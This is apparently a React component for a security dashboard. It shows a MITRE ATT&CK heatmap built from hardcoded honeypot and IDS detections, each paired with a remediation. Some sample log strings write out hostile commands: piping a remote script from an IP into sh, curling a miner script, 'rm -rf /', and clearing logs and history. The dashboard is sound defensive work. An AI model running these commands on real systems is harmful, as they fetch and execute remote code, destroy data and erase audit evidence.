import React, { useState } from 'react';
import { Shield, ShieldAlert, X, Terminal, Cpu } from 'lucide-react';

interface Technique {
  id: string;
  name: string;
  count: number;
  description: string;
  detections: string[];
  remediations: string[];
  severity: 'critical' | 'high' | 'medium' | 'none';
}

interface TacticColumn {
  id: string;
  name: string;
  techniques: Technique[];
}

export const MITREMatrixView: React.FC = () => {
  const [selectedTech, setSelectedTech] = useState<Technique | null>(null);

  // MITRE ATT&CK High-Fidelity Threat Matrix Data
  const matrixData: TacticColumn[] = [
    {
      id: 'TA0043',
      name: 'Reconnaissance',
      techniques: [
        { 
          id: 'T1595', name: 'Active Scanning', count: 1845, severity: 'high',
          description: 'Attacker conducts active network scanning to detect vulnerabilities or open ports on outer infrastructure nodes.',
          detections: ['Suricata alert: CVE-2023-49103 scan vector on port 8000', 'Cowrie honeypot: port scan from subnet 194.26.135.0/24'],
          remediations: ['Block the source IP blocks at firewall border.', 'Implement rate limiting on all public API endpoints.']
        },
        { 
          id: 'T1592', name: 'Gather Host Info', count: 420, severity: 'medium',
          description: 'Attacker queries public metadata services or probes host banners to inspect OS and library versions.',
          detections: ['NIDS signature: HTTP Banner Grabbing payload detected'],
          remediations: ['Disable descriptive server tokens in Nginx/Apache configuration.']
        }
      ]
    },
    {
      id: 'TA0042',
      name: 'Resource Dev',
      techniques: [
        { 
          id: 'T1583', name: 'Acquire Infrastructure', count: 910, severity: 'medium',
          description: 'Threat actors leverage compromised proxy hosting or commercial VPS instances to conduct automated attacks.',
          detections: ['Intel feed lookup: source IP listed on threat actor database'],
          remediations: ['Update threat intelligence feeds dynamically every hour.']
        },
        { 
          id: 'T1587', name: 'Develop Exploits', count: 0, severity: 'none',
          description: 'No threat mappings recorded on honeypots for custom exploit tool assembly.',
          detections: [], remediations: []
        }
      ]
    },
    {
      id: 'TA0001',
      name: 'Initial Access',
      techniques: [
        { 
          id: 'T1190', name: 'Exploit Public App', count: 7420, severity: 'critical',
          description: 'Attacker attempts remote code execution by targeting known vulnerabilities in internet-facing services.',
          detections: ['Suricata: Web Application Exploit Attempt - Log4j payload found', 'NIDS: CVE-2021-44228 injection attempt'],
          remediations: ['Apply vendor security patch immediately.', 'Validate and sanitize all ingress input headers.']
        },
        { 
          id: 'T1133', name: 'External Services', count: 120, severity: 'medium',
          description: 'Threat actors scan for exposed administrative interfaces like RDP, SSH, or unauthenticated databases.',
          detections: ['Cowrie honeypot: connection request on port 22'],
          remediations: ['Enforce Multi-Factor Authentication (MFA).', 'Move SSH console access behind an enterprise VPN.']
        }
      ]
    },
    {
      id: 'TA0002',
      name: 'Execution',
      techniques: [
        { 
          id: 'T1059', name: 'Command Interpreter', count: 6510, severity: 'critical',
          description: 'Attacker executes arbitrary system commands inside the honeypot shell using Python, Bash, or PowerShell.',
          detections: ['Cowrie SSH shell command execution: wget http://194.26.135.84/sh.txt -O - | sh', 'Honeypot alert: unauthorized shell spawn'],
          remediations: ['Implement app control and application blocklists.', 'Restrict write access in target directory systems.']
        },
        { 
          id: 'T1203', name: 'Exploit Client', count: 140, severity: 'medium',
          description: 'Exploitation of weak client applications to run arbitrary background tasks.',
          detections: ['NIDS alert: outbound anomalous user-agent signature'],
          remediations: ['Keep client browsers and terminal packages up-to-date.']
        }
      ]
    },
    {
      id: 'TA0003',
      name: 'Persistence',
      techniques: [
        { 
          id: 'T1098', name: 'Account Manipulation', count: 4200, severity: 'high',
          description: 'Attacker adds secondary keys to SSH authorized_keys or modifies shadow system configurations.',
          detections: ['Cowrie: attempted write to /root/.ssh/authorized_keys', 'SSH log: new public key injected'],
          remediations: ['Configure file integrity monitor checks on the authorized_keys directory.', 'Enforce root access lockdown.']
        },
        { 
          id: 'T1543', name: 'Create System Process', count: 850, severity: 'medium',
          description: 'Execution of a background systemd service or cron job to maintain permanent persistence.',
          detections: ['Honeypot logs: cron file modified under /etc/cron.d/'],
          remediations: ['Lock cron modifications to administrative users only.', 'Audit systemd startup processes.']
        }
      ]
    },
    {
      id: 'TA0004',
      name: 'Privilege Esc',
      techniques: [
        { 
          id: 'T1548', name: 'Bypass Access Controls', count: 2890, severity: 'high',
          description: 'Targeting configuration vulnerabilities in sudo or setuid binary flags to escalate standard user privileges.',
          detections: ['Cowrie terminal log: sudo -l probe executed', 'Syslog: unauthorized sudo switch request'],
          remediations: ['Audit sudoers configurations.', 'Enforce strict principle of least privilege.']
        }
      ]
    },
    {
      id: 'TA0005',
      name: 'Defense Evasion',
      techniques: [
        { 
          id: 'T1070', name: 'Indicator Removal', count: 3200, severity: 'high',
          description: 'Threat actors clear history records, system logs, or security agent traces to obfuscate evidence.',
          detections: ['Cowrie: history -c command executed', 'Terminal log: rm -rf /var/log/syslog'],
          remediations: ['Configure secure off-site syslog streaming.', 'Enforce immutable logs storage protocols.']
        },
        { 
          id: 'T1140', name: 'Deobfuscate Files', count: 540, severity: 'medium',
          description: 'Decoding of base64 script payloads or decompressing compressed archives prior to execution.',
          detections: ['Honeypot: base64 -d utility flag triggered'],
          remediations: ['Audit base64 execution patterns dynamically using endpoint scanners.']
        }
      ]
    },
    {
      id: 'TA0006',
      name: 'Credential Access',
      techniques: [
        { 
          id: 'T1110', name: 'Brute Force', count: 15420, severity: 'critical',
          description: 'Systematic brute-force password scanning against SSH console terminals to discover root credentials.',
          detections: ['Cowrie honeypot: 540 failed login attempts from IP 85.203.47.112 in 5 minutes'],
          remediations: ['Install fail2ban or equivalent security orchestrators.', 'Disable standard SSH password logins and enforce key authentication.']
        },
        { 
          id: 'T1078', name: 'Valid Accounts', count: 9840, severity: 'critical',
          description: 'Successful authentication into SSH services using weak or leaked administrative credentials.',
          detections: ['Cowrie honeypot: successful root authentication with password "123456"'],
          remediations: ['Enforce complex, non-generic password rotation schedules.']
        }
      ]
    },
    {
      id: 'TA0007',
      name: 'Discovery',
      techniques: [
        { 
          id: 'T1046', name: 'Network Discovery', count: 5200, severity: 'high',
          description: 'Threat actors query local subnets or list open sockets using tools like ping, ss, netstat, or nmap.',
          detections: ['Cowrie: netstat -antp command executed'],
          remediations: ['Restrict user execution flags on standard network utility binaries.']
        },
        { 
          id: 'T1082', name: 'System Info Discovery', count: 1980, severity: 'medium',
          description: 'Querying CPU details, Linux kernel version, or virtualization indicators.',
          detections: ['Honeypot: uname -a and cat /proc/cpuinfo executed'],
          remediations: ['Minimize system disclosure scopes to standard users.']
        }
      ]
    },
    {
      id: 'TA0008',
      name: 'Lateral Movement',
      techniques: [
        { 
          id: 'T1021', name: 'Remote Services', count: 3100, severity: 'high',
          description: 'Attacker leverages stolen keys to login to adjacent virtual hosts via SSH or RDP channels.',
          detections: ['NIDS alert: anomalous SSH connection vector from compromised node'],
          remediations: ['Implement zero-trust microsegmentation controls on local subnets.']
        }
      ]
    },
    {
      id: 'TA0011',
      name: 'Command & Control',
      techniques: [
        { 
          id: 'T1571', name: 'Non-Standard Port', count: 2900, severity: 'high',
          description: 'Communication to anomalous external IPs on non-standard ports to bypass standard ingress filters.',
          detections: ['Suricata alert: outbound TCP connection to port 9999 from isolated host'],
          remediations: ['Implement strict default-deny egress policies.']
        },
        { 
          id: 'T1105', name: 'Ingress Tool Transfer', count: 1800, severity: 'high',
          description: 'Downloading secondary malware toolkits, bots, or miners into local hosts.',
          detections: ['Honeypot audit: curl -O http://malicious-domain/miner.sh'],
          remediations: ['Restrict outbound HTTP/HTTPS access on non-admin user sessions.']
        }
      ]
    },
    {
      id: 'TA0040',
      name: 'Impact',
      techniques: [
        { 
          id: 'T1485', name: 'Data Destruction', count: 1500, severity: 'high',
          description: 'Attempts to delete server files or execute ransomware routines.',
          detections: ['Cowrie alert: rm -rf / executed on virtual filesystem mount'],
          remediations: ['Keep daily read-only offline disaster backup configurations.']
        }
      ]
    }
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 'var(--spacing-lg)' }}>
      {/* Header Info */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: 'rgba(255, 255, 255, 0.6)', fontSize: '12px', fontFamily: 'var(--font-mono)' }}>
          <Shield style={{ color: 'var(--color-primary)' }} size={14} />
          <span>MITRE ATT&CK HEATMAP ORCHESTRATOR - SEVERITY WEIGHTED</span>
        </div>
        <div style={{ display: 'flex', gap: '16px', fontSize: '10px', fontFamily: 'var(--font-mono)' }}>
          <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
            <span style={{ width: '8px', height: '8px', background: 'rgba(244, 63, 94, 0.25)', border: '1px solid var(--color-danger)' }} />
            CRITICAL ({'>'}5,000 EXPLOITS)
          </span>
          <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
            <span style={{ width: '8px', height: '8px', background: 'rgba(245, 158, 11, 0.2)', border: '1px solid var(--color-warning)' }} />
            HIGH ({'>'}1,000 EXPLOITS)
          </span>
          <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
            <span style={{ width: '8px', height: '8px', background: 'rgba(59, 130, 246, 0.15)', border: '1px solid var(--color-secondary)' }} />
            MEDIUM
          </span>
        </div>
      </div>

      {/* Main Grid & Drawer split */}
      <div style={{ display: 'grid', gridTemplateColumns: selectedTech ? '1fr 340px' : '1fr', gap: 'var(--spacing-lg)', transition: 'grid-template-columns var(--transition-normal)' }}>
        
        {/* 12 Column Tactics Grid */}
        <div className="glass-panel" style={{ overflowX: 'auto', padding: 'var(--spacing-md)' }}>
          <div className="mitre-grid">
            {matrixData.map(col => (
              <div key={col.id} className="mitre-column">
                <div className="mitre-header">
                  {col.name}
                </div>
                {col.techniques.map(tech => {
                  const isSelected = selectedTech?.id === tech.id;
                  const heatClass = tech.severity === 'critical' ? 'heat-critical' : 
                                    tech.severity === 'high' ? 'heat-high' : 
                                    tech.severity === 'medium' ? 'heat-medium' : '';
                                    
                  return (
                    <div 
                      key={tech.id} 
                      className={`mitre-cell ${heatClass}`}
                      style={{
                        border: isSelected ? '1px solid var(--color-primary)' : '',
                        boxShadow: isSelected ? 'var(--shadow-neon)' : ''
                      }}
                      onClick={() => setSelectedTech(tech)}
                    >
                      <div className="mitre-cell-title">{tech.name}</div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '8px', alignItems: 'center' }}>
                        <span className="mitre-cell-id">{tech.id}</span>
                        {tech.count > 0 && <span className="mitre-cell-count">{tech.count.toLocaleString()}</span>}
                      </div>
                    </div>
                  );
                })}
              </div>
            ))}
          </div>
        </div>

        {/* Selected Technique Inspector Drawer */}
        {selectedTech && (
          <div className="glass-panel glowing" style={{ display: 'flex', flexDirection: 'column', gap: 'var(--spacing-md)' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid rgba(255, 255, 255, 0.05)', paddingBottom: '12px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <ShieldAlert size={16} style={{ color: 'var(--color-primary)' }} />
                <span style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', fontWeight: 700, color: 'var(--color-primary)' }}>
                  MITRE TACTICAL INSPECT
                </span>
              </div>
              <button 
                onClick={() => setSelectedTech(null)}
                style={{ background: 'transparent', border: 'none', color: 'rgba(255, 255, 255, 0.4)', cursor: 'pointer' }}
              >
                <X size={16} />
              </button>
            </div>

            <div>
              <h4 style={{ fontFamily: 'var(--font-display)', fontSize: '18px', fontWeight: 800, color: '#ffffff' }}>
                {selectedTech.name}
              </h4>
              <span className="status-pill critical" style={{ fontSize: '9px', marginTop: '6px' }}>
                ID: {selectedTech.id} | SEVERITY: {selectedTech.severity}
              </span>
            </div>

            <div style={{ fontSize: '13px', color: 'rgba(226, 232, 240, 0.7)', lineHeight: 1.5 }}>
              <h5 style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', textTransform: 'uppercase', color: 'rgba(226, 232, 240, 0.4)', marginBottom: '4px' }}>
                Description
              </h5>
              <p>{selectedTech.description}</p>
            </div>

            {/* Mapped Honeypot/NIDS Detections */}
            {selectedTech.detections.length > 0 && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <h5 style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', textTransform: 'uppercase', color: 'rgba(226, 232, 240, 0.4)' }}>
                  Active Sensor Logs
                </h5>
                <div style={{ background: '#000000', padding: '12px', border: '1px solid rgba(255, 255, 255, 0.05)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {selectedTech.detections.map((det, index) => (
                    <div key={index} style={{ fontFamily: 'var(--font-mono)', fontSize: '9px', color: '#10b981', display: 'flex', gap: '6px', alignItems: 'flex-start' }}>
                      <Terminal size={10} style={{ flexShrink: 0, marginTop: '2px' }} />
                      <span>{det}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Security Remediation Steps */}
            {selectedTech.remediations.length > 0 && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <h5 style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', textTransform: 'uppercase', color: 'rgba(226, 232, 240, 0.4)' }}>
                  SOC Security Remediation
                </h5>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {selectedTech.remediations.map((rem, index) => (
                    <div key={index} style={{ fontSize: '12px', color: '#ffffff', display: 'flex', gap: '8px', alignItems: 'flex-start' }}>
                      <Cpu size={12} style={{ color: 'var(--color-primary)', marginTop: '2px', flexShrink: 0 }} />
                      <span>{rem}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
